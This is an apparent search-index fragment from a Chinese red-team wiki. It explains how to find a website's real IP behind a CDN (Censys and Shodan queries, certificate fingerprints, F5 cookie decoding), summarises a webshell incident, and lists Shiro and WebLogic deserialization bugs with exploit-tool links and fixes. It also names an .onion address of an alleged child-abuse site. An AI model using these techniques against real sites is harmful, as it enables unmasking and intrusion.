\u8981\u9010\u4e2a\u67e5\u770b\u8fd9\u4e9b\u641c\u7d22\u7ed3\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5355\u51fb\u53f3\u4fa7\u7684\u201cExplore\u201d\uff0c\u6253\u5f00\u5305\u542b\u591a\u4e2a\u5de5\u5177\u7684\u4e0b\u62c9\u83dc\u5355\u3002What's using this certificate? > IPv4 Hosts \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5c06\u770b\u5230\u4e00\u4e2a\u4f7f\u7528\u7279\u5b9a\u8bc1\u4e66\u7684IPv4\u4e3b\u673a\u5217\u8868\uff0c\u800c\u771f\u5b9e\u539f\u59cb IP\u5c31\u85cf\u5728\u5176\u4e2d\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5bfc\u822a\u5230\u7aef\u53e3443\u4e0a\u7684IP\u6765\u9a8c\u8bc1\uff0c\u770b\u5b83\u662f\u5426\u91cd\u5b9a\u5411\u5230xyz123boot.com\uff1f\u6216\u5b83\u662f\u5426\u76f4\u63a5\u5728IP\u4e0a\u663e\u793a\u7f51\u7ad9\uff1f \u4f7f\u7528\u7ed9\u5b9a\u7684SSL\u8bc1\u4e66 \u5982\u679c\u4f60\u662f\u6267\u6cd5\u90e8\u95e8\u7684\u4eba\u5458\uff0c\u60f3\u8981\u627e\u51fa\u4e00\u4e2a\u9690\u85cf\u5728cheesecp5vaogohv.onion\u4e0b\u7684\u513f\u7ae5\u8272\u60c5\u7f51\u7ad9\u3002\u505a\u597d\u7684\u529e\u6cd5\uff0c\u5c31\u662f\u627e\u5230\u5176\u539f\u59cbIP\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8ffd\u8e2a\u5230\u5176\u6258\u7ba1\u7684\u670d\u52a1\u5668\uff0c\u751a\u81f3\u67e5\u5230\u80cc\u540e\u7684\u8fd0\u8425\u5546\u4ee5\u53ca\u91d1\u878d\u7ebf\u7d22\u3002 \u9690\u85cf\u670d\u52a1\u5177\u6709SSL\u8bc1\u4e66\uff0c\u8981\u67e5\u627e\u5b83\u4f7f\u7528\u7684IPv4\u4e3b\u673a\uff0c\u53ea\u9700\u5c06\"SHA1 fingerprint\"\uff08\u7b7e\u540d\u8bc1\u4e66\u7684sha1\u503c\uff09\u7c98\u8d34\u5230Censys IPv4\u4e3b\u673a\u641c\u7d22\u4e2d\uff0c\u5373\u53ef\u627e\u5230\u8bc1\u4e66\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u914d\u7f6e\u9519\u8bef\u7684Web\u670d\u52a1\u5668\u3002 \u65b9\u6cd55:\u5229\u7528HTTP\u6807\u5934\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u501f\u52a9SecurityTrails\u8fd9\u6837\u7684\u5e73\u53f0\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5728\u832b\u832b\u7684\u5927\u6570\u636e\u641c\u7d22\u5230\u81ea\u5df1\u7684\u76ee\u6807\uff0c\u751a\u81f3\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83HTTP\u6807\u5934\u6765\u67e5\u627e\u5230\u539f\u59cb\u670d\u52a1\u5668\u3002 \u7279\u522b\u662f\u5f53\u7528\u6237\u62e5\u6709\u4e00\u4e2a\u975e\u5e38\u7279\u522b\u7684\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u8f6f\u4ef6\u540d\u79f0\u65f6\uff0c\u653b\u51fb\u8005\u627e\u5230\u4f60\u5c31\u53d8\u5f97\u66f4\u5bb9\u6613\u3002 \u5982\u679c\u8981\u641c\u7d22\u7684\u6570\u636e\u76f8\u5f53\u591a\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u7ec4\u5408\u641c\u7d22\u53c2\u6570\u3002\u5047\u8bbe\u4f60\u6b63\u5728\u4e0e1500\u4e2aWeb\u670d\u52a1\u5668\u5171\u4eab\u4f60\u7684\u670d\u52a1\u5668HTTP\u6807\u5934\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u90fd\u53d1\u9001\u7684\u662f\u76f8\u540c\u7684\u6807\u5934\u53c2\u6570\u548c\u503c\u7684\u7ec4\u5408\u3002\u800c\u4e14\u4f60\u8fd8\u4f7f\u7528\u65b0\u7684PHP\u6846\u67b6\u53d1\u9001\u552f\u4e00\u7684HTTP\u6807\u5934\uff08\u4f8b\u5982\uff1aX-Generated-Via\uff1aXYZ\u6846\u67b6\uff09\uff0c\u76ee\u524d\u7ea6\u6709400\u540d\u7f51\u7ad9\u7ba1\u7406\u5458\u4f7f\u7528\u4e86\u8be5\u6846\u67b6\u3002\u800c\u6700\u7ec8\u7531\u4e09\u4e2a\u670d\u52a1\u5668\u7ec4\u6210\u7684\u4ea4\u96c6\uff0c\u53ea\u9700\u624b\u52a8\u64cd\u4f5c\u5c31\u53ef\u4ee5\u627e\u5230\u4e86IP\uff0c\u6574\u4e2a\u8fc7\u7a0b\u53ea\u9700\u8981\u51e0\u79d2\u949f\u3002 \u4f8b\u5982\uff0cCensys\u4e0a\u7528\u4e8e\u5339\u914d\u670d\u52a1\u5668\u6807\u5934\u7684\u641c\u7d22\u53c2\u6570\u662f80.http.get.headers.server :\uff0c\u67e5\u627e\u7531CloudFlare\u63d0\u4f9b\u670d\u52a1\u7684\u7f51\u7ad9\u7684\u53c2\u6570\u5982\u4e0b\uff1a 80.http.get.headers.server:cloudflare \u65b9\u6cd56:\u5229\u7528\u7f51\u7ad9\u8fd4\u56de\u7684\u5185\u5bb9\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u5982\u679c\u539f\u59cb\u670d\u52a1\u5668IP\u4e5f\u8fd4\u56de\u4e86\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u7f51\u4e0a\u641c\u7d22\u5927\u91cf\u7684\u76f8\u5173\u6570\u636e\u3002 \u6d4f\u89c8\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u5bfb\u627e\u72ec\u7279\u7684\u4ee3\u7801\u7247\u6bb5\u3002\u5728JavaScript\u4e2d\u4f7f\u7528\u5177\u6709\u8bbf\u95ee\u6216\u6807\u8bc6\u7b26\u53c2\u6570\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\uff08\u4f8b\u5982Google Analytics\uff0creCAPTCHA\uff09\u662f\u653b\u51fb\u8005\u7ecf\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\u3002 \u4ee5\u4e0b\u662f\u4eceHackTheBox\u7f51\u7ad9\u83b7\u53d6\u7684Google Analytics\u8ddf\u8e2a\u4ee3\u7801\u793a\u4f8b\uff1a ga\uff08'create'\uff0c'UA-93577176-1'\uff0c'auto'\uff09; \u53ef\u4ee5\u4f7f\u752880.http.get.body\uff1a\u53c2\u6570\u901a\u8fc7body/source\u8fc7\u6ee4Censys\u6570\u636e\uff0c\u4e0d\u5e78\u7684\u662f\uff0c\u6b63\u5e38\u7684\u641c\u7d22\u5b57\u6bb5\u6709\u5c40\u9650\u6027\uff0c\u4f46\u4f60\u53ef\u4ee5\u5728Censys\u8bf7\u6c42\u7814\u7a76\u8bbf\u95ee\u6743\u9650\uff0c\u8be5\u6743\u9650\u5141\u8bb8\u4f60\u901a\u8fc7Google BigQuery\u8fdb\u884c\u66f4\u5f3a\u5927\u7684\u67e5\u8be2\u3002 Shodan\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8eCensys\u7684\u670d\u52a1\uff0c\u4e5f\u63d0\u4f9b\u4e86http.html\u641c\u7d22\u53c2\u6570\u3002 \u641c\u7d22\u793a\u4f8b\uff1a https://www.shodan.io/search?query=http.html%3AUA-32023260-1 \u65b9\u6cd57:\u4f7f\u7528\u56fd\u5916\u4e3b\u673a\u89e3\u6790\u57df\u540d \u65b9\u6cd58:\u7f51\u7ad9\u6f0f\u6d1e\u67e5\u627e 1\uff09\u76ee\u6807\u654f\u611f\u6587\u4ef6\u6cc4\u9732\uff0c\u4f8b\u5982\uff1a.git\u6587\u4ef6\u6cc4\u9732\uff0c.svn\u6587\u4ef6\u6cc4\u9732\uff0cphpinfo\u4e4b\u7c7b\u7684\u63a2\u9488\u3001GitHub\u4fe1\u606f\u6cc4\u9732\u7b49\u3002 2\uff09XSS\u76f2\u6253\uff0c\u547d\u4ee4\u6267\u884c\u53cd\u5f39shell\uff0cSSRF\u7b49\u3002 3\uff09\u65e0\u8bba\u662f\u7528\u793e\u5de5\u8fd8\u662f\u5176\u4ed6\u624b\u6bb5\uff0c\u62ff\u5230\u4e86\u76ee\u6807\u7f51\u7ad9\u7ba1\u7406\u5458\u5728CDN\u7684\u8d26\u53f7\uff0c\u4ece\u800c\u5728\u4eceCDN\u7684\u914d\u7f6e\u4e2d\u627e\u5230\u7f51\u7ad9\u7684\u771f\u5b9eIP\u3002 \u65b9\u6cd59:\u7f51\u7ad9\u90ae\u4ef6\u8ba2\u9605\u67e5\u627e \u65b9\u6cd510\uff1a\u7528 Zmap \u626b\u5168\u7f51 \u9700\u8981\u627e xiaix.me \u7f51\u7ad9\u7684\u771f\u5b9e IP\uff0c\u6211\u4eec\u9996\u5148\u4ece apnic \u83b7\u53d6 IP \u6bb5\uff0c\u7136\u540e\u4f7f\u7528 Zmap \u7684 banner-grab \u626b\u63cf\u51fa\u6765 80 \u7aef\u53e3\u5f00\u653e\u7684\u4e3b\u673a\u8fdb\u884c banner \u6293\u53d6\uff0c\u6700\u540e\u5728 http-req \u4e2d\u7684 Host \u5199 xiaix.me \u65b9\u6cd511\uff1aF5 LTM\u89e3\u7801\u6cd5 \u5f53\u670d\u52a1\u5668\u4f7f\u7528F5 LTM\u505a\u8d1f\u8f7d\u5747\u8861\u65f6\uff0c\u901a\u8fc7\u5bf9set-cookie\u5173\u952e\u5b57\u7684\u89e3\u7801\u771f\u5b9eip\u4e5f\u53ef\u88ab\u83b7\u53d6\uff0c\u4f8b\u5982\uff1aSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\uff0c\u5148\u628a\u7b2c\u4e00\u5c0f\u8282\u7684\u5341\u8fdb\u5236\u6570\u5373487098378\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u65701d08880a\uff0c\u63a5\u7740\u4ece\u540e\u81f3\u524d\uff0c\u4ee5\u6b64\u53d6\u56db\u4f4d\u6570\u51fa\u6765\uff0c\u4e5f\u5c31\u662f0a.88.08.1d\uff0c\u6700\u540e\u4f9d\u6b21\u628a\u4ed6\u4eec\u8f6c\u4e3a\u5341\u8fdb\u5236\u657010.136.8.29\uff0c\u4e5f\u5c31\u662f\u6700\u540e\u7684\u771f\u5b9eip 0 x 0 5 \u65c1 \u7ad9 \u548cC\u6bb5","title":"0x02 \u7ed5\u8fc7 CDN \u67e5\u627e\u7f51\u7ad9\u771f\u5b9e IP"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/","text":"\u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8 \u00b6 \u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0 \u00b6 \u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002 \u4e8c\u3001\u884c\u4e3a\u5206\u6790 \u00b6 \u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002 \u4e09\u3001\u5f71\u54cd\u5206\u6790 \u00b6 \u653b\u51fbIP\u5217\u8868 \u00b6 10.2.84.115 \u53d7\u5bb3IP\u5217\u8868 \u00b6 10.2.84.115 \u56db\u3001\u5904\u7f6e\u5efa\u8bae \u00b6 \u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u6eaf\u6e90\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#webshell","text":"","title":"\u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_1","text":"\u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002","title":"\u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_2","text":"\u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002","title":"\u4e8c\u3001\u884c\u4e3a\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_3","text":"","title":"\u4e09\u3001\u5f71\u54cd\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip","text":"10.2.84.115","title":"\u653b\u51fbIP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip_1","text":"10.2.84.115","title":"\u53d7\u5bb3IP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_4","text":"\u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u56db\u3001\u5904\u7f6e\u5efa\u8bae"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/","text":"\u65e5\u5e38exp shiro\u7c7b \u00b6 Apache shiro \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe \u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u5206\u6790\uff08CVE-2020-1957\uff09 https://www.freebuf.com/vuls/231909.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea71.5.2\u7248\u672c\u53ca\u4ee5\u4e0a\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL \u8def\u5f84\u8868\u8fbe\u5f0f. weblogic\u76f8\u5173 \u00b6 Weblogic T3 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Weblogic Server \u4e2d \u7684 RMI \u901a \u4fe1 \u4f7f \u7528 T3 \u534f \u8bae \u5728 Weblogic Server \u548c \u5176 \u5b83 Java \u7a0b \u5e8f \uff08 \u5ba2 \u6237 \u7aef \u6216 \u8005 \u5176 \u5b83 Weblogic Server \u5b9e \u4f8b \uff09 \u4e4b \u95f4 \u4f20 \u8f93 \u6570 \u636e , \u670d\u52a1\u5668\u5b9e\u4f8b\u4f1a\u8ddf\u8e2a\u8fde\u63a5\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2aJava \u865a\u62df\u673a\uff08JVM \uff09\u4e2d, \u5e76 \u521b \u5efa T3 \u534f \u8bae \u901a \u4fe1 \u8fde \u63a5 , \u5c06 \u6d41 \u91cf \u4f20 \u8f93 \u5230 Java \u865a \u62df \u673a . T3 \u534f \u8bae \u5728 \u5f00 \u653e WebLogic \u63a7 \u5236 \u53f0 \u7aef \u53e3 \u7684 \u5e94 \u7528 \u4e0a \u9ed8 \u8ba4 \u5f00 \u542f . \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u53d1\u9001\u6076\u610f\u7684\u7684\u53cd\u5e8f\u5217\u5316\u6570\u636e, \u8fdb\u884c\u53cd\u5e8f\u5217\u5316, \u5b9e\u73b0\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684weblogic\u7ec4\u4ef6\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u653b\u51fb. \u5f71\u54cd\u8303\u56f4 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.3.0 \u6f0f\u6d1e\u7279\u5f81 \u53ef\u4ee5\u6839\u636eweblogic\u7684\u62a5\u9519\u9875\u9762\u4f5c\u4e3a\u7279\u5f81\uff1a The server has not found anything matching the Request-URI.No indication is given of whether the condition is temporary or permanent.\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6f0f\u6d1e\u590d\u73b0 Weblogic t3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2019-2890)\u5206\u6790 http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/ Weblogic T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2018-2628\uff09 https://blog.csdn.net/Aaron_Miller/article/details/106657746 \u76f8\u5173\u6f0f\u6d1e\u5305\u62ec\uff1a CVE-2017-3248 https://paper.seebug.org/333/ CVE-2018-2628 https://paper.seebug.org/985/ CVE-2018-2893 https://www.freebuf.com/vuls/178105.html CVE-2019-2890 https://paper.seebug.org/1069/ CVE-2020-2555(Oracle Coherence) https://paper.seebug.org/1141/ \u5229\u7528\u5de5\u5177 weblogic \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 https://github.com/0xn0ne/weblogicScanner \u9632\u62a4\u65b9\u6cd5 \u53ca \u65f6 \u66f4 \u65b0 \u8865 \u4e01 \u7981 \u7528 T3 \u534f \u8bae \u7981 \u6b62 T3 \u7aef \u53e3 \u5bf9 \u5916 \u5f00 \u653e 